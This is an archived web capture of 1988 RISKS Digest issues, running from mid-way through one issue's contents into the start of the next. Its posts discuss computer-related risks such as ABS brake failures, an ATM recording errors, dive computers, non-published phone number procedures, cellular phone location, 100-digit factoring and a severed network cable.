<A HREF="#subj3.1">
Amos Shapir
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Dive Computers 
</A>
<DD>
<A HREF="#subj4.1">
Terry S. Arnold
</A><br>
<A HREF="#subj4.2">
 Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Emergency Access to Unlisted Telephone Numbers 
</A>
<DD>
<A HREF="#subj5.1">
Dave Wortman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Risks of Cellular Phones 
</A>
<DD>
<A HREF="#subj6.1">
Wes Plouff
</A><br>
<A HREF="#subj6.2">
 Peter Robinson
</A><br>
<A HREF="#subj6.3">
 Walter Doerr
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Computers, Copyright Law, and the Honor System (a talk) 
</A>
<DD>
<A HREF="#subj7.1">
Mark Mandel
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Re: Killer terminals 
</A>
</H3>
<address>
Steve Wilson 
&lt;<A HREF="mailto:hplabs!stevew@nsc.nsc.com">
hplabs!stevew@nsc.nsc.com
</A>&gt;
</address>
<i>
Wed, 5 Oct 88 12:42:58 PDT
</i><PRE>

After seeing all the articles about Killer terminals I thought I'd relate a
story about a killer card reader.  Many moons ago I was a computer operator at
the local community college.  The computer was a Nova 2/10 that spent most of
the day running a Basic interpreter talking to 4 ASR-33s.  Every afternoon we
would bring the Basic system down and run jobs for the Fortran class.  We
couldn't do this often because the card reader(this was ALONG time ago) would
work for about a week, then mysteriously die.  We must have had 20 service
calls on this card reader over 3-4 month period.  Everytime the technician
would come out with a new card reader and replace the old one.  Finally, the
technician who had to keep on making this weekly trip looked into what was
causing the problem.  (I'm not sure why he didn't do this the 2nd time the card
reader went out, but...)  His explanation was that the card reader was "too
fast" for the Nova and the real damage was being done by the interface card
from the Nova trying to slow the card reader down.  They repaired the problem
by "turning down" the card reader to a level the Nova could keep up with.

Steve Wilson, National Semiconductor 

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Can't Happen and Antilock Braking Systems (from Usenet rec.autos)
</A>
</H3>
<address>
&lt;<A HREF="mailto:Mark Brader <msb@sq.sq.com>    [SoftQuad Inc., Toronto]">
Mark Brader &lt;msb@sq.sq.com&gt;    [SoftQuad Inc., Toronto]
</A>&gt;
</address>
<i>
Thu, 6 Oct 88 05:54:10 EDT
</i><PRE>

From: marcus@bbn.com (Marcus Barrow)
Newsgroups: rec.autos
Subject: abs, just say no...
Date: 3 Oct 88 15:40:03 GMT
Organization: Bolt Beranek and Newman Inc., Cambridge MA

   I've been seeing this discussion of abs for awhile now, and i have a
small story to tell. A friend of mine runs a very modified '87 'vette in the
New England Hillclimb series. This car naturally enough has abs, along with
oversize rotors, suspension mods and a ~350 b.h.p. smallblock. Abs is
probably a "good thing" for many drivers.
   But for Mike, " I ain't 'fraid o' no ZR1", there is another story. It
seems at Burke Mt. he approached a corner, pushing 90 as he is wont to do.
The paved surface at these hills is less than ideal, and the situation is
agravated by tripling and quadrupling the speed limit. So the car hit a bump
or waver in the pavement and took a skip. Now what does the abs do once the
wheels are off the ground? It's not programmed to deal with wheel lockup.
It's supposed to prevent that. When four wheels lock up, the unit apparently
shuts down for .5 seconds. The pedal stays hard but nothing happens for a
terribly long moment...
   Mike's car is repairable, but now he's afraid of abs at least!
                                                                     Marcus@bbn
   p.s. please folks, don't try this at home...

    - = - =  - = - =  - = - =  - = - =  - = - =  - = - =  - = - =  - = - = 

From: robert@milk10.uucp (Robert Allen)
Newsgroups: rec.autos
Subject: Re: abs, just say no...
Date: 3 Oct 88 21:43:03 GMT
Organization: SRI International, Menlo Park CA

    This isn't the first time this problem has been noted.  When abs
    first became popular some track racers tested it out.  Their
    universal complaint was that when they topped a certain bump
    in the track, the car lost traction as it became temporarily
    airborne, and abs interpreted that to mean that abs should be
    activated since traction was lost.

    Computer programs in big computers aren't yet smart enough to
    do the instant pattern recognition that the human mind can
    apparently make in such circumstances (ie "I haven't REALLY
    lost traction yet"), let alone some gimpy program in cars ROM.

				- abs.  Just say No.

    Robert Allen, robert@spam.istc.sri.com, 415-859-2143 (work phone, days)

</PRE>
<HR><H3><A NAME="subj2.2">
ATM's credit check
</A>
</H3>
<address>
Amos Shapir
&lt;<A HREF="mailto:amos@taux02.UUCP ">
amos@taux02.UUCP 
</A>&gt;
</address>
<i>
8 Oct 88 21:33:29 GMT
</i><PRE>

The other night I tried to make a withdrawal of the maximum daily amount
allowed. The  ATM considered  my request, and  the said  something like:
"Service temporarily unavailable",  which usually means "I  have run out
of cash". Trying  again later, it insisted that I  was no longer allowed
to withdraw  anything on that business  day. As Murphy would  have it, I
was completely out of cash.

Since all major banks here are tied  on the same network, no ATM in town
would allow me any credit, and those that can show previous transactions
indicated that a withdrawal of the  requested amount has been made. This
transaction disappeared from the records the next day, and my credit was
restored automatically.

It's quite obvious  that to save network traffic, the  same message from
the ATM to  the central database which asks for  confirmation of credit,
also serves to inform it of a withdrawal; it seems that the ATM does not
report incomplete transactions. Such sloppiness in programming would not
be tolerated  in any business, but  frankly, my dear, I  don't think the
banks give a $%^&amp;$@.

Amos Shapir, National Semiconductor (Israel) P.O.B. 3007, Herzlia 46104, Israel
Tel. +972 52 522261

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Dive Computers (Re: <A HREF="/Risks/7.60.html">RISKS-7.60</A>, Brian Randell)
</A>
</H3>
<address>
"Terry S. Arnold" 
&lt;<A HREF="mailto:Arnold@DOCKMASTER.ARPA">
Arnold@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Tue, 4 Oct 88 21:07 EDT
</i><PRE>

The advent of dive computers has changed the way most serious divers go about
their sport.  Prior to the introduction of dive computers we had to rely on a
variety of dive tables based in most cases on originals published in 1959.  The
current generation of dive computers are based on more current research work on
Decompression Sickness and just how nitrogen (the cause of Decompression
Sickness) is exchanged during diving.  In the past we had to work with our own
fudge factors for the artificial dive profiles that the tables assumed.  Most
divers fudged on the "safe" side were successful in avoiding the bends.  The
modern dive computers use a more realistic model of how sport diving is really
done and eliminates the need for fudge factors.  Like any piece of modern
safety equipment dive computer can and are misused sometimes with ill effects.
Unlike the usual dive tables the dive computer come with a considerable amount
of literature including research references.  When I purchased my dive computer
I looked up the refrences and read the papers.  I found that the dive computers
were more conservative than the tables and provided guidance on how to take
age, sex, and physical activity into account in a much more realistic way than
the guidance published for the dive tables.

I use a dive computer for all of my diving (&gt;200 dives in the last 18 months)
and will not dive any other way.  I have developed methods so that I can revert
back to the tables if a computer failure ever occurs.  Most of the reports that
I have read in the diving press including the professional association journals
indicates that dive computers lead to an overall improved level of safety.  The
reports that I have seen where divers have suffered from the bends while using
dive computers have been strongly correlated with using them to the limits
under extreme conditions.  In short they were being pushed to the region where
the theory was starting to get on thin ground and the tables were just as
questionable.  This is one case where computers are most likely reducing the
risk rather than increasing the risk.
                                                  Terry Arnold
 
</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Diving Computers
</A>
</H3>
<address>
&lt;<A HREF="mailto:henry@utzoo  <@RELAY.CS.NET,@neat.ai.toronto.edu:henry@utzoo>">
henry@utzoo  &lt;@RELAY.CS.NET,@neat.ai.toronto.edu:henry@utzoo&gt;
</A>&gt;
</address>
<i>
Wed, 5 Oct 88 12:38:24 EDT
</i><PRE>

&gt;... the computer software may be based on unsafe data, that it does not
&gt;take into account such factors as age, fitness, sex and exertion, and therefore
&gt;gives divers a false sense of security....

I am not a diver, but I am driven to wonder whether the old tables make any
real effort to take age, fitness, sex, and exertion into account.  It seems
much more likely to me that the *real* problem here is not that the software
is buggy or unsafe, but that divers are falling into the "computers are
always right" trap.  That is, everyone knew that the tables were only an
approximation to the truth, and used them cautiously, but the supposedly-
omniscient computer is not inspiring the same level of distrust.

Another consideration: the computers do (I'm told) take more variables into
account.  But this isn't necessarily a good thing:  since the tables could not
do so, they needed safety margins that would accommodate extremes of those
variables.  That meant that, most of the time, the tables had large safety
margins.  Divers may well have gotten used to that.  It's even possible that
those big safety margins were hiding some over-optimistic assumptions, which
the software writers have copied.

                                 Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<HR><H3><A NAME="subj4.2">
Emergency Access to Unlisted Telephone Numbers
</A>
</H3>
<address>
Dave Wortman 
&lt;<A HREF="mailto:dw@csri.toronto.edu">
dw@csri.toronto.edu
</A>&gt;
</address>
<i>
Wed, 5 Oct 88 12:35:37 EDT
</i><PRE>

The article below was originally posted to misc.consumers.  I thought it might
be of interest to RISKS readers as an example of a well-thought-out set of
administrative procedures designed to balance the needs of protection of
privacy and response to emergency situations.

=======================================================================

All examples in this message pertain to Illinois Bell Telephone Company, which
covers the Chicago metropolitan area, and quite a bit of the rest of Illinois.

There are three types of phone numbers which do not appear in the printed and
publicly available directory: (1) Too new to list (2) Non-listed (3) Non-pub.
[discussion of types (1) and (2) deleted.]

The third category of numbers not in the phone book or available from the
Directory Assistance Bureau are non-published numbers. Non-pub numbers are NOT
available at the Directory Assistance level. Inquiries about same which are
input into a DA terminal simply come up with a message that 'at the customer's
request, the number is not listed in our records; the number is non-published.'

Well, who does keep non-pub records then? The Business Office has no handy way
to retrieve them, since they depend on an actual phone number when they pull up
a record to discuss an account. Once a service order is processed, the number
and associated name are no longer available to the average worker in the
central office.

There was for several years a small group known as the 'NonPub Number Bureau'
which at the time was located in Hinsdale, IL. Needless to say, the phone
number to the NonPub Number Bureau was itself non-published, and was only
available to specified employees at Bell who were deemed to have a 'need to
know'. Now I think with all the records being highly computerized, the keepers
of the non-pub phone numbers are themselves scattered around from one phone
office to another.

When there is some specific need for an employee at the phone company to
acquire the non-published number of a subscriber, then certain security
precautions kick into place. Only a tiny percentage of telephone company
employees are deemed to have a 'need to know' in the first place; among
these would be the GCO's (Group Chief Operators), certain management people
in the central offices, certain people in the Treasury/Accounting office,
and of course, security representatives both from Illinois Bell and the
various long distance carriers, such as AT&amp;T/Sprint/MCI.

Let us have a hypothetical example for our Correspondent: Your mother has taken
seriously ill, and is on her deathbed. Your brother is unable to reach you to
notify you of this because you have a non-pub number. When his request for the
number has been turned down by Directory Assistance, simply because they do not
have it, he asks to speak with a supervisor, and he explains the problem. He
provides his own name and telephone number, and the supervisor states he will
be called back at a later time. The supervisor does not question if in fact an
emergency exists, which is the only valid reason for breaking security. The
supervisor may, if they are doing their job correctly, ask the inquirer point
blank, "Are you stating there is an emergency situation?".

Please bear in mind that the law in Illinois and in many other states says that
if a person claims that an emergency exists in order to influence the use (or
discontinuance of use) of the telephone when in fact there is no emergency is
guilty of a misdemeanor crime. You say yes this is an emergency and I need to
contact my brother/sister/etc right away. The supervisor will then talk to
his/her supervisor, who is generally of the rank of Chief Operator for that
particular facility.

The Chief Operator will call the NonPub people, will identify herself, and
*leave her own call back number*. The NonPub people will call back to verify
the origin of the call, and only then will there be information given out
regards your brother's telephone number. It helps if you know the *exact* way
the name appears in the records, and the *exact* address; if there is more than
one of that name with non-pub service, they may tell you they are unable to
figure out who it is you want.

The NonPub person will then call the subscriber with the non-published number
and explain to them what has occurred: So and so has contacted one of our
operators and asked for assistance in reaching you. The party states that it is
a family emergency which requires your immediate attention. Would it be alright
if we give him/her your number, *or would you prefer to call them back
yourself?*

Based on the answer given, the number is either relayed back to the Chief
Operator, or a message is relayed back saying the non-pub customer has been
notified. If the customer says it is okay to pass his number, then the Chief
Operator will call you back, ask who YOU are, rather than saying WHO she wants,
and satisfied with your identification will give you the number you are seeking
or will advise you that your brother has been given the message by someone from
our office, and has said he will contact you.

Before the NonPub people will even talk to you, your 'call back number' has to
be on their list of approved numbers for that purpose. A clerk in the Business
Office cannot imitate a Chief Operator for example, simply because NonPub would
say that the number you are asking us to call back to is not on our list. "Tell
your supervisor what it is you are seeking and have them call us..."

Other emergency type requests for non-pub numbers would be a big fire at some
business place in the middle of the night, and the owners of the company must
be notified at their home; or a child is found wandering by the police and
the child is too young to know his parent's (non-pub) number.

They will also handle non-emergency requests, but only if they are of some
importance and not frivolous in nature. You have just come to our city to visit
and are seeking a long lost friend who has a non-pub number; you are compiling
the invitations to your high school class fiftieth re-union and find a class
member is non-pub. Within certain reasonable limits, they will pass along your
request to the desired party and let them make the choice of whether to return
the call or not. But always, you leave your phone number with them, and in due
time someone will call you back to report what has been said or done.

You would be surprised -- or maybe you wouldn't -- at the numerous scams and
[........] stories people tell the phone company to get the non-pub number of
someone else. Fortunately, Bell takes a great deal of pride in their efforts to
protect the privacy of their subscribers.

Patrick Townson, The Portal System(TM) 
uunet!portal!cup.portal.com!Patrick_A_Townson

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Risks of Cellular Phones
</A>
</H3>
<address>
Wes Plouff
&lt;<A HREF="mailto:plouff%nac.DEC@decwrl.dec.com ">
plouff%nac.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
6 Oct 88 09:45
</i><PRE>

Recent writers to RISKS, starting with Chuck Weinstock in issue 7.57, have
focused on the risk of vehicle location by cellular telephone systems.  In my
opinion, they exaggerate this risk and underestimate another risk of mobile
phones, the complete lack of privacy in radio transmissions.

Roughly 10 years ago I designed vehicle location controller hardware and
firmware used in the Washington-Baltimore cellular demonstration system.
That system led directly to products sold at least through the first 
waves of cellular system construction a few years ago.

Since cellular base stations have intentionally limited geographic coverage,
vehicle location is a requirement. This limitation is used to conserve radio
channels; one cell's frequencies can be re-used by others far enough away in
the same metropolitan area.  The cell system must determine which cell a mobile
user is located in when he begins a call, and when during a conversation a
vehicle crosses from one cell into another.  Cells are set up perhaps 3 to 20
miles in diameter and range from circular to very irregular shapes.  Cellular
phone systems are designed with ample margins so that statistically very few
calls will be lost or have degraded voice quality.

Making this system work does not require anything so fancy as
triangulation.  Vehicle location needs to be only good enough to keep
signal quality acceptably high.  John Gilmore explained in RISKS 7.58
how this works while the mobile phone is on-hook.  During a
conversation, the base station periodically measures the signal strength
of an active mobile in its cell.  When the signal strength goes below a
threshold, adjacent cells measure the mobile's signal strength.  This
'handoff trial' procedure requires no interaction with the mobile.  If
the mobile was stronger by some margin in an adjacent cell, both the mobile
phone and the cellular exchange switch are ordered to switch to a channel and
corresponding phone line in the new cell.  Since base stations commonly use
directional antennas to cover a full circle, mobiles could be reliably located
in one third of the cell area at best.  Distance-measuring techniques advocated
by AT&amp;T were not adopted because the added cost was too high for the modest
performance gain.

Certainly a cellular phone system can locate a mobile at any time, and always
locates a mobile during a conversation.  But the information is not
fine-grained enough to implement some of the schemes imagined by previous
writers.

A more important risk is the risk of conversations being intercepted.  The
public airwaves are simply that: public.  Scanner radios can easily be found or
modified to cover the cellular band, and listeners will tolerate lower signal
quality than cellular providers, hence one scanner can listen to cell base
stations over a wide area.  The communications privacy law is no shield because
listeners are undetectable.  To bring this back to risks of computers,
automated monitoring and recording of selected mobile phones is probably beyond
the reach of the average computer hobbyist, but easily feasible for a
commercial or government organization using no part of the infrastructure
whatever, just the control messages available on the air.

Wes Plouff, Digital Equipment Corp, Littleton, Mass.
plouff%nac.dec@decwrl.dec.com

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Risks of cellular telephones
</A>
</H3>
<address>
Peter Robinson 
&lt;<A HREF="mailto:pr@computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK">
pr@computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
28 Sep 88 10:10:47 +0100 (Wednesday)
</i><PRE>

As a radio amateur, I have always been taught that using mobile transmitters
near petrol stations is bad form - the radiation from the transmitter can
induce currents in nearby metalwork and perhaps cause a spark.  The thought of
a cellular telephone being able to transmit without the operator's consent (in
response to a paging call) is, therefore, slightly RISKy.

This could even get worse as technology progesses.  As the sunspot cycle
advances, it seems plausible that transmissions will carry further and
interfere with those in nearby cells (not the adjacent ones, they usually have
distinct frequencies).  Before long the manufacturers will introduce adaptive
control where the transmitter power is adjusted dynamically to compensate for
variations in the signal path between the mobile and base stations.  So then
when you pull into a petrol station and receive a call, the system will notice
that all the surrounding metal is impairing your signal and will increase the
transmitter power accordingly...

Incidentally, I am not sure what power these radios use, but I would be
slightly nervous about using a hand-held telephone with the antenna anywhere
near my eyes if it is more than a few Watts.

</PRE>
<HR><H3><A NAME="subj6.2">
Risks of cellular phones
</A>
</H3>
<address>
"Walter Doerr" 
&lt;<A HREF="mailto:wd@dg2kk.UUCP">
wd@dg2kk.UUCP
</A>&gt;
</address>
<i>
Sat, 8 Oct 88 15:59:56 MET
</i><PRE>

Chuck Weinstock &lt;weinstoc@SEI.CMU.EDU&gt; writes in RISKS 7.57:

&gt; Subject: Risks of Cellular Phones?
&gt;
&gt; While discussing radio triangulation last night, the question came up:
&gt; If I dial a phone number attached to a cellular phone, how does the
&gt; cellular system know which cell should send the ring signal to the
&gt; phone?  Is it a system wide broadcast, or does the cellular phone
&gt; periodically broadcast a "here I am" signal?

In the 'C-Net' here in Germany, all mobile phones send a "here I am" signal
whenever they move to a new cell. This information (the cell where the phone
can be reached) is stored in the database of the phone's "home" base.  Calls to
mobile phones are routed to a computer in Frankfurt which contacts the home
base computer (based on the first few digits of the mobile phonenumber), which,
in turn, knows the cell the phone is currently in.

&gt; If the latter, a less than benevolent government (or phone company for
&gt; that matter) could use that information to track its citizens' cars'
&gt; whereabouts.

According to an article in an electronics magazine, the German PTT was
approached by a police agency, who expressed interest in the data stored in the
networks computers.  The article quotes a Siemens mobile telephone specialist
as saying that it isn't possible to pinpoint the current location of a mobile
phone because:

	- the phone must be switched on for the network to recognize it
	- the cells use omnidirectional antennas, so it isn't possible
	  to determine the direction from where the mobile phone's signal came.

While this is true, it is certainly possible to determine the location of a
phone with an accuracy of a few miles (the size of the cell the phone is in)
without using any additional direction finding methods (radio triangulation).

Walter Doerr

</PRE>
<HR><H3><A NAME="subj6.3">
Computers, Copyright Law, and the Honor System (a talk)
</A>
</H3>
<address>
Mark Mandel 
&lt;<A HREF="mailto:Mandel@BCO-MULTICS.HBI.HONEYWELL.COM">
Mandel@BCO-MULTICS.HBI.HONEYWELL.COM
</A>&gt;
</address>
<i>
Mon, 10 Oct 88 09:47 EDT
</i><PRE>

"ARE WE ALL ON THE HONOR SYSTEM?":
Computers, Copyright Law, and the Honor System
Mark A. Fischer, of counsel to the firm of Wolf, Greenfield &amp; Sacks Boston

Easy access to information through computer databases has given tremendous
power to people once called readers -- now known as "end-users."  The change in
title is significant.  End-users have the power to reproduce, store, transmit,
and use information once reserved to publishers.  Are the legal obligations
coincident with the ethical?  Are the legal obligations enforceable?  Are we
all on the honor system?

Mr. Fischer represents publishers, software firms, musicians, authors,
performing artists, and theatrical and motion-picture producers.  He holds a
law degree from Boston College Law School and specializes in copyright,
publishing, entertainment, arts and computer law.  He has taught courses in
Copyright and Trademark Law and in Intellectual Property.  His writing has
appeared in BILLBOARD, the JOURNAL OF THE COPYRIGHT SOCIETY, and ANIMAFILM.  He
is a member of the American Bar Association's Forum Committee on the
Entertainment and Sports Industries, and chairman of the Boston Patent Law
Association's Copyright Law Committee.

                               WEDNESDAY, 19 October 1988
                                          7:30 P.M.
              8th floor lounge, 545 Technology Square, Cambridge
              (Corner of Main &amp; Vassar Streets, in Kendall Square)
                                 Free parking in front

    SPONSORED BY COMPUTER PROFESSIONALS FOR SOCIAL RESPONSIBILITY
    CPSR/Boston  *  P.O. Box 962  *  Cambridge, MA  02142  *  617-666-CPSR

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.62.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.64.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-16</DOCNO>
<DOCOLDNO>IA012-000131-B034-306</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.64.html 128.240.150.127 19970217023423 text/html 24557
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:32:54 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 64</TITLE>
<LINK REL="Prev" HREF="/Risks/7.63.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.65.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.63.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.65.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 64</H1>
<H2> Thursday 1 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
100 digit primes no longer safe in crypto 
</A>
<DD>
<A HREF="#subj1.1">
Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks of computer controlled doors 
</A>
<DD>
<A HREF="#subj2.1">
Piet van Oostrum
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  NSFnet Backbone Shot 
</A>
<DD>
<A HREF="#subj3.1">
Gene Spafford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Intersection of ANI and Voice Mail Risks 
</A>
<DD>
<A HREF="#subj4.1">
Gary McClelland
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  New Feynman book 
</A>
<DD>
<A HREF="#subj5.1">
Eugene Miya
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  High `Rev'ing Volvo 
</A>
<DD>
<A HREF="#subj6.1">
Hartel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Stevie Wonder gives an Ear-itating Performance 
</A>
<DD>
<A HREF="#subj7.1">
Marshall Jose
</A><br>
<A HREF="#subj7.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  OMB "Blacklist"? 
</A>
<DD>
<A HREF="#subj8.1">
Hugh Miller
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Ethics of Conflict Simulation 
</A>
<DD>
<A HREF="#subj9.1">
Scott Wilde
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
100 digit primes no longer safe in crypto
</A>
</H3>
<address>
davy@riacs.edu  
&lt;<A HREF="mailto:David A. Curry">
David A. Curry
</A>&gt;
</address>
<i>
Wed, 12 Oct 88 20:34:01 -0700
</i><PRE>

Taken from the San Jose Mercury News, Oct. 12, 1988, Page 8A:

Computers able to make light work of cracking code (Los Angeles Times)

  Some secret codes intended to restrict access to military secrets and Swiss
bank accounts may not be as safe as had been presumed, a team of computer
experts demonstrated Tuesday.
  The team succeeded in doing what security experts thought could not be done:
using ordinary computers to break down a 100-digit number into the components
that produce it when multiplied together.
  That process, called factoring, holds the key to many security codes.
  Before Tuesday, experts had believed that if the number was large enough -
up to 100 digits - its factoring would take about 10 months with a Cray super-
computer, one of the most powerful computers in the world.
  But computer experts across the United States, Europe and Australia solved
the problem more quickly by using 400 processors simultaneously.  They linked
their computers electronically and factored a 100-digit number in just 26 days.
  The number has two factors, one 41 digits long and the other 60 digits long.
  And that, according to Arjen Lenstra, professor of computer science at the
University of Chicago, should be quite sobering to experts who believe they
are secure with codes based on numbers that large.  Lenstra headed the project,
along with Mark S. Manasse of the Digital Equipment Corp.'s Systems Research
Center in Palo Alto.

	[ quotes from experts ]

  Rodney M. Goodman, associate professor of electrical engineering and an
expert on cryptography at the California Institute of Technology in Pasadena,
described the achievement as "significant," because it means that some systems
may not be as secure as had been thought.  But he said it did not mean that
security experts around the world would have to rebuild their systems.
  "All the cryptographers will do is increase the length of the number by a
few more digits," he said, "because the problem gets exponentially worse as
you increase the size of the number."  A larger number is more cumbersome, and
cryptographers had tried to kep the number as small as possible.

	[ explanation of the idea behind using large numbers with
	  prime factors in cryptography ]

  Last year, Lenstra decided to tackle the problem on "a small scale, just to
see if he could do it," according to Larry Arbeiter, spokesman for the Univ-
ersity of Chicago.  "It was a pure science type of effort."
  Several months ago, Lenstra presented his idea to Manasse, a computer re-
search scientist with Digital.  Manasse became so intrigued with the problem
that his company agreed to fund much of the cost, including the use of more
than 300 computer processors at the Palo Alto company during off-duty hours.
The company manufactures DEC computers.
  "I was interested in the general problem of taking a program and breaking it
up into small pieces" so that many could work simultaneously toward the sol-
ution, Manasse said.
  Other computer enthusiasts from the "factoring community" clamored aboard
and this fall more than 400 computers around the globe were ready to give it a
try.
  The computers ranged in size from microcomputers to a Cray supercomputer,
but even personal computers with large memories could have been used, Lenstra
said.  Each of the participating computers was given a different part of the
problem to solve, and success came early Tuesday morning.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Risks of computer controlled doors
</A>
</H3>
<address>
Piet van Oostrum
&lt;<A HREF="mailto:piet@ruuinf.UUCP ">
piet@ruuinf.UUCP 
</A>&gt;
</address>
<i>
12 Oct 88 11:20:12 GMT
</i><PRE>

Amsterdam, The Netherlands

The new Amsterdam Stopera (combined town hall - music theater) has to
undergo $1 million of upgrading, although it is only a few years old. One
of the things to be done is redoing the computers controlling the doors, as
several people have had the experience of being locked up.

Piet van Oostrum, Dept of Computer Science, University of Utrecht
Padualaan 14, P.O. Box 80.089, 3508 TB Utrecht, The Netherlands
Telephone: +31-30-531806              UUCP: ...!mcvax!ruuinf!piet

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
NSFnet Backbone Shot
</A>
</H3>
<address>
Gene Spafford
&lt;<A HREF="mailto:spaf@purdue.edu ">
spaf@purdue.edu 
</A>&gt;
</address>
<i>
12 Oct 88 19:14:22 GMT
</i><PRE>

The following mail was forwarded to me a few minutes ago.  This refers to
the MCI fiber used to carry the NSFnet backbone.  No wonder some of my mail
has disappeared recently!                  [From: field inadvertently deleted?]

=&gt; Date: Wed, 12 Oct 88 12:47:00 EDT
=&gt; To: watchdogs@um.cc.umich.edu, ie@merit.edu
=&gt; Subject: A bit of trivia
=&gt; 
=&gt; The fiber that goes from Houston to Pittsburgh was broken due
=&gt; to a gun blast....that is right, a gun blast.
=&gt; Somewhere in the swamps of the Bayou (between Alabama and New Orleans)
=&gt; the fiber cables are suspended above the swamps and a good ol'
=&gt; boy was apparently target practicing on the cable.
=&gt;  
=&gt; Traffic has been rerouted and when the investigation has taken place
=&gt; and the cable fixed we will be put back on the original circuit.

Gene Spafford
NSF/Purdue/U of Florida  Software Engineering Research Center,
Dept. of Computer Sciences, Purdue University, W. Lafayette IN 47907-2004
Internet:  spaf@cs.purdue.edu	uucp:	...!{decwrl,gatech,ucbvax}!purdue!spaf

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
